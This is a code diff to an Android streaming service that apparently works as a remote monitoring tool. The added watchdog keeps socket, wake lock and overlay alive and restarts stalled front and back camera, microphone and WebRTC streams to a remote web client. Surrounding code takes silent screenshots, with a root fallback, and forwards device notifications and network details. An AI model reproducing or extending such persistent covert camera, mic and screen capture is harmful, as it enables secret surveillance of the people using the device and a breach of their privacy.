-            
+
             String connectionType = "Unknown";
             String ssid = "Unavailable";
             int rssi = -127;
@@ -2057,7 +2236,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                     }
                     rssi = wifiInfo.getRssi();
                     linkSpeed = wifiInfo.getLinkSpeed();
-                    
+
                     int ip = wifiInfo.getIpAddress();
                     localIp = String.format(Locale.getDefault(), "%d.%d.%d.%d",
                             (ip & 0xff), (ip >> 8 & 0xff), (ip >> 16 & 0xff), (ip >> 24 & 0xff));
@@ -2157,7 +2336,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                 Log.d(TAG, "Silent screenshot captured via root screencap fallback");
                 sendScreenshotResponse(rootImage, null);
             } else {
-                String errorMsg = "Silent screenshot requires Accessibility Service to be enabled in Android Settings > Accessibility > Installed apps > " 
+                String errorMsg = "Silent screenshot requires Accessibility Service to be enabled in Android Settings > Accessibility > Installed apps > "
                         + getString(R.string.app_name) + " (or Root access).";
                 sendScreenshotResponse(null, errorMsg);
             }
@@ -2228,7 +2407,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
                         }
                     }
                 }
-                
+
                 JSONObject payload = new JSONObject();
                 payload.put("to", webClientId);
                 payload.put("from", socket.id());
@@ -2298,7 +2477,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             sensorManager.unregisterListener(this);
         }
         stopLocationUpdates();
-        
+
         if (cameraManager != null) {
             cameraManager.stopCapturers();
             cameraManager.dispose();
@@ -2313,7 +2492,7 @@ public class StreamingService extends Service implements android.hardware.Sensor
             localRecorder.stop(null);
             localRecorder = null;
         }
-        
+
         setMicStreaming(false);
         audioTransceiver = null;
         if (peerConnection != null) {
@@ -2331,6 +2510,115 @@ public class StreamingService extends Service implements android.hardware.Sensor
 
         Intent intent = new Intent(this, NotificationListener.class);
         stopService(intent);
+    }
+
+    private void startInternalWatchdog() {
+        internalWatchdogHandler.removeCallbacks(internalWatchdogRunnable);
+        internalWatchdogHandler.postDelayed(internalWatchdogRunnable, INTERNAL_WATCHDOG_INTERVAL_MS);
+    }
+
+    private void stopInternalWatchdog() {
+        internalWatchdogHandler.removeCallbacks(internalWatchdogRunnable);
+    }
+
+    public boolean isServiceRunning() {
+        return instance != null;
+    }
+
+    public void ensureSocketConnected() {
+        if (socket != null && !socket.connected()) {
+            try {
+                Log.d(TAG, "Watchdog reconnecting Socket.IO...");
+                socket.connect();
+            } catch (Exception e) {
+                Log.e(TAG, "Error connecting socket", e);
+            }
+        }
+    }
+
+    /**
+     * Periodic watchdog check that verifies whether the service is streaming normally
+     * and reconnects/re-runs components if anything has stalled or disconnected.
+     */
+    public synchronized void checkAndEnforceStreaming() {
+        Log.d(TAG, "[InternalWatchdog] Checking streaming health...");
+
+        // 1. Check socket connectivity
+        ensureSocketConnected();
+
+        // 2. Ensure wake lock is acquired and held
+        acquireWakeLock();
+
+        // 3. Ensure overlay view is present for background camera/mic stability
+        OverlayWindowManager.ensureOverlay(this);
+
+        // 4. Verify and re-run active camera streams if stalled
+        if (cameraManager != null) {
+            if (isBackCameraStreaming) {
+                if (!cameraManager.isBackRunning()) {
+                    Log.w(TAG, "[InternalWatchdog] Back camera should be streaming but capturer stopped! Restarting...");
+                    cameraManager.startBackCamera();
+                }
+                if (cameraManager.getBackTrack() != null) {
+                    cameraManager.getBackTrack().setEnabled(true);
+                }
+            }
+            if (isFrontCameraStreaming) {
+                if (!cameraManager.isFrontRunning()) {
+                    Log.w(TAG, "[InternalWatchdog] Front camera should be streaming but capturer stopped! Restarting...");
+                    cameraManager.startFrontCamera();
+                }
+                if (cameraManager.getFrontTrack() != null) {
+                    cameraManager.getFrontTrack().setEnabled(true);
+                }
+            }
+        }
+
+        // 5. Verify and re-run active mic stream if stalled
+        if (isMicStreaming && (audioTrack == null || audioSource == null)) {
+            Log.w(TAG, "[InternalWatchdog] Mic stream is flagged active but audio track is null. Re-initializing...");
+            setMicStreaming(true);
+        }
+
+        // 6. Check WebRTC PeerConnection health when a web client is waiting
+        if (webClientId != null && socket != null && socket.connected()) {
+            if (peerConnection == null ||
+                    peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.FAILED ||
+                    peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.DISCONNECTED ||
+                    peerConnection.iceConnectionState() == PeerConnection.IceConnectionState.CLOSED) {
+                Log.w(TAG, "[InternalWatchdog] PeerConnection is in failed/disconnected state (" +
+                        (peerConnection != null ? peerConnection.iceConnectionState() : "null") + "). Rebuilding...");
+                rebuildPeerConnection();
+            }
+        }
+
+        // 7. Push telemetry keepalive
+        sendStreamStatus();
+        sendDeviceInfo();
+
+        // 8. Re-arm external watchdog alarm
+        StreamingWatchdogReceiver.scheduleNext(this);
+    }
+
+    public synchronized void rebuildPeerConnection() {
+        Log.i(TAG, "Rebuilding WebRTC PeerConnection from scratch...");
+        try {
+            synchronized (pendingIceCandidates) {
+                pendingIceCandidates.clear();
+            }
+            if (peerConnection != null) {
+                try {
+                    peerConnection.close();
+                } catch (Exception ignored) {}
+                peerConnection = null;
+            }
+            setupPeerConnection();
+            if (webClientId != null && socket != null && socket.connected()) {
+                createAndSendOffer();
+            }
+        } catch (Exception e) {
+            Log.e(TAG, "Error rebuilding PeerConnection", e);
+        }
     }
 
     public void sendNotification(StatusBarNotification sbn) {
